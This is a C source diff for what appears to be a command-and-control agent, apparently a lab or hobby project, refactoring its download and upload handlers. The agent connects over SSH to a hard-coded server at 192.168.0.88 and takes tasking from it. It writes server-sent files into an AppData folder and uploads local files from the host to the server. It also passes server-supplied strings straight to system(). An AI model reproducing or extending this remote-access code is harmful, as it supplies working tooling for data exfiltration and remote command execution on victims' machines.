@@ -20,6 +20,111 @@ int catchChannelError(int check, ssh_channel chan) {
 	return check;
 }
 
+void sendOk(ssh_channel chan) {
+	catchChannelError(ssh_channel_write(chan, "ok", 3), chan);
+}
+
+int downloadFile(ssh_channel chan) {
+	fprintf(logfile, "Received orders to download file %s\n", firstStruct->opts);
+	char* contents;
+	char size[256];			//Needs to be fixed
+
+	unsigned int sendBufferSize = 4 + strlen(firstStruct->opts);
+	char* send = malloc(sendBufferSize);
+	if (send == 0) return -1;				//An absurd amount of safety to make the intellisense happy. I don't know, I suppose something really bad could happen but I seriously doubt it.
+	_itoa_s(firstStruct->operation, send, sendBufferSize, 10);
+	strcat_s(send, sendBufferSize, "|");
+	strcat_s(send, 4 + strlen(firstStruct->opts), firstStruct->opts);
+
+	catchChannelError(ssh_channel_write(chan, send, strlen(send) + 1), chan);
+	catchChannelError(ssh_channel_read(chan, size, sizeof(size), 0), chan);
+
+	sendOk(chan);
+
+	size[255] = '\0';					//Some more safety
+	size_t memsize = atoi(size) + 1;
+
+	contents = malloc(memsize);
+	if (contents) {						//Almost an absurd amount of safety (it makes the Visual Studio intellisense happy)
+		catchChannelError(ssh_channel_read(chan, contents, memsize, 0), chan);
+		contents[memsize - 1] = '\0';
+		sendOk(chan);
+	}
+	else return -1;
+
+	char* filecontent = malloc(b64_decoded_size(contents));
+	if (filecontent) {
+		b64_decode(contents, filecontent, b64_decoded_size(contents));
+		filecontent[b64_decoded_size(contents)] = '\0';
+	}
+	else return -1;
+
+	FILE* file;
+
+	char filename[256] = "";
+	strcpy_s(filename, _countof(filename), folderpath);
+	strcat_s(filename, _countof(filename), "\\");
+	strcat_s(filename, _countof(filename), firstStruct->opts);
+	fopen_s(&file, filename, "w");
+	if (file == NULL)
+	{
+		fprintf(logfile, "Unable to create file.\n");
+	}
+	else {
+		fputs(filecontent, file);
+		fclose(file);
+	}
+}
+
+int uploadFile(ssh_channel chan) {
+	fprintf(logfile, "Got tasking to upload file %s\n", firstStruct->opts);
+	char* ufilename;
+	FILE* toupload;
+	char* sendcommand;
+	char* filedata;
+	char temp[14];
+
+	ufilename = malloc(strlen(firstStruct->opts));
+	int lastslash = 0;
+	for (unsigned int i = 0; i < strlen(firstStruct->opts); ++i) {
+		if (firstStruct->opts[i] == '\\') lastslash = i;
+	}
+
+	strncpy_s(ufilename, strlen(firstStruct->opts), firstStruct->opts + lastslash + 1, strlen(firstStruct->opts));
+
+	fopen_s(&toupload, firstStruct->opts, "r");
+	if (toupload == NULL) catchChannelError(-1, chan);
+	if (toupload != 0) {
+		fseek(toupload, 0L, SEEK_END);
+		int uploadsize = ftell(toupload);
+		int uploadsizee = b64_encoded_size(uploadsize);
+		unsigned int sendCommandSize = strlen(firstStruct->opts) + 4;
+		sendcommand = malloc(sendCommandSize);
+		if (sendcommand != 0) {
+			strcpy_s(sendcommand, sendCommandSize, "11|");
+			strcat_s(sendcommand, sendCommandSize, ufilename);
+			rewind(toupload);
+
+			catchChannelError(ssh_channel_write(chan, sendcommand, sendCommandSize), chan);
+			catchChannelError(ssh_channel_read(chan, temp, 3, 0), chan);
+
+			sprintf_s(temp, _countof(temp), "%d", uploadsizee);
+			catchChannelError(ssh_channel_write(chan, temp, sizeof(temp)), chan);
+			catchChannelError(ssh_channel_read(chan, temp, 3, 0), chan);
+
+			filedata = malloc(uploadsize + 1);
+			if (filedata != 0) {
+				fread(filedata, 1, uploadsize + 1, toupload);
+				char* encodedfiledata = b64_encode((unsigned char*)filedata, uploadsize);
+				catchChannelError(ssh_channel_write(chan, encodedfiledata, uploadsizee), chan);
+				catchChannelError(ssh_channel_read(chan, temp, 8, 0), chan);
+			}
+		}
+		else catchChannelError(-1, chan);
+	}
+	else catchChannelError(-1, chan);
+}
+
 int parse_tasking(char* tasking, ssh_channel chan) {
 	/* Parses and handles the tasking input from the server*/
 
@@ -52,21 +157,23 @@ int parse_tasking(char* tasking, ssh_channel chan) {
 		memset(tmpbf, 0, sizeof(tmpbf));
 		strncat_s(tmpbf, _countof(tmpbf), p, 2);
 		struct tasking_struct* curr = malloc(sizeof(struct tasking_struct));
-		curr->operation = atoi(tmpbf);
+		if (curr) {
+			curr->operation = atoi(tmpbf);
 
-		// get options for operation
-		dat = _strdup(p + 3);
-		curr->opts = dat;
+			// get options for operation
+			dat = _strdup(p + 3);
+			curr->opts = dat;
 
-		if (firstStruct == NULL) {
-			firstStruct = curr;
-			lastStruct = curr;
+			if (firstStruct == NULL) {
+				firstStruct = curr;
+				lastStruct = curr;
+			}
+			else {
+				lastStruct->nextStruct = curr;
+				lastStruct = curr;
+			}
 		}
-		else {
-			lastStruct->nextStruct = curr;
-			lastStruct = curr;
-		}
-
+		else return -1;
 
 		// clean up and move on
 		p = strtok_s(NULL, "\n", &nextToken);
@@ -78,87 +185,10 @@ int parse_tasking(char* tasking, ssh_channel chan) {
 		switch (firstStruct->operation)
 		{
 		case AGENT_DOWN_FILE:
-			fprintf(logfile, "Received orders to download file %s\n", firstStruct->opts);
-			char *contents;
-			char size[256];
-
-			char *send = malloc(sizeof(*send) * (4+strlen(firstStruct->opts)));
-			char temp2[3];
-			_itoa_s(firstStruct->operation, temp2, _countof(temp2), 10);
-			strcpy_s(send, _countof(send), temp2);
-			strcat_s(send, _countof(send), "|");
-			strcat_s(send, 4+strlen(firstStruct->opts), firstStruct->opts);
-			catchChannelError(ssh_channel_write(chan, send, strlen(send)+1), chan);
-			catchChannelError(ssh_channel_read(chan, size, sizeof(size), 0), chan);
-			catchChannelError(ssh_channel_write(chan, "ok", 3), chan);
-			
-			size_t memsize = atoi(size) + 1;
-
-			contents = malloc(sizeof(*contents) * memsize);
-
-			catchChannelError(ssh_channel_read(chan, contents, memsize, 0), chan);
-			contents[atoi(size)] = '\0';
-			catchChannelError(ssh_channel_write(chan, "ok", 3), chan);
-
-			char *filecontent = malloc(sizeof(*filecontent) * b64_decoded_size(contents));
-			b64_decode(contents, filecontent, b64_decoded_size(contents));
-			filecontent[b64_decoded_size(contents)] = '\0';
-
-			FILE* file;
-
-			char filename[256] = "";
-			strcpy_s(filename, _countof(filename), folderpath);
-			strcat_s(filename, _countof(filename), "\\");
-			strcat_s(filename, _countof(filename), firstStruct->opts);
-			fopen_s(&file, filename, "w");
-			if (file == NULL)
-			{
-				fprintf(logfile, "Unable to create file.\n");
-			}
-			else {
-				fputs(filecontent, file);
-				fclose(file);
-			}
+			downloadFile(chan);
 			break;
 		case AGENT_UP_FILE:
-			fprintf(logfile, "Got tasking to upload file %s\n", firstStruct->opts);
-			char* ufilename;
-			FILE* toupload;
-			char* sendcommand;
-			char* filedata;
-			char temp[14];
-
-			ufilename = malloc(sizeof(ufilename) * strlen(firstStruct->opts));
-			int lastslash = 0;
-			for (unsigned int i = 0; i < strlen(firstStruct->opts); ++i) {
-				if (firstStruct->opts[i] == '\\') lastslash = i;
-			}
-			
-			strncpy_s(ufilename, strlen(firstStruct->opts), firstStruct->opts + lastslash + 1, strlen(firstStruct->opts));
-
-			fopen_s(&toupload, firstStruct->opts, "r");
-			if (toupload == NULL) catchChannelError(-1, chan);
-			fseek(toupload, 0L, SEEK_END);
-			int uploadsize = ftell(toupload);
-			int uploadsizee = b64_encoded_size(uploadsize);
-			sendcommand = malloc(sizeof(sendcommand) * (strlen(firstStruct->opts) + 3));
-			filedata = malloc(sizeof(filedata) * (uploadsize + 1));
-			strcpy_s(sendcommand, _countof(sendcommand), "11|");
-			strcat_s(sendcommand, strlen(firstStruct->opts) + 3, ufilename);
-			rewind(toupload);
-
-			catchChannelError(ssh_channel_write(chan, sendcommand, strlen(sendcommand)), chan);
-			catchChannelError(ssh_channel_read(chan, temp, 3, 0), chan);
-			char sizebuf[64] = "ok";
-			sprintf_s(temp, _countof(temp), "%d", uploadsizee);
-			catchChannelError(ssh_channel_write(chan, temp, sizeof(temp)), chan);
-			catchChannelError(ssh_channel_read(chan, temp, 3, 0), chan);
-
-			fread(filedata, 1, uploadsize, toupload);
-			char* encodedfiledata = b64_encode((unsigned char*)filedata, uploadsize);
-			catchChannelError(ssh_channel_write(chan, encodedfiledata, uploadsizee), chan);
-			catchChannelError(ssh_channel_read(chan, temp, 8, 0), chan);
-
+			uploadFile(chan);
 			break;
 		case AGENT_EXEC_SC:
 			system(firstStruct->opts);
@@ -261,13 +291,15 @@ int main()
 	}
 	strcat_s(folderpath, _countof(folderpath), actualusername);
 	strcat_s(folderpath, _countof(folderpath), "\\AppData\\Roaming\\NICKTEST");
-	_mkdir((const char*) folderpath);
+	int directorySuccess = _mkdir((const char*) folderpath);
 
 	char logpath[256] = "";
 	strcpy_s(logpath, _countof(logpath), folderpath);
 	strcat_s(logpath, _countof(folderpath), "\\log.txt");
 	fopen_s(&logfile, logpath, "a");
 	
+	if (logfile == 0) return -1;
+
 	fprintf(logfile, "==============================\n\n");
 	
 	session = connectserver("192.168.0.88", "WINDOWS_CLIENT");	//Make this less hard-coded
@@ -280,7 +312,6 @@ int main()
 		fclose(logfile);
 		return 0;
 	}
-
 
 	func_loop(session);
 
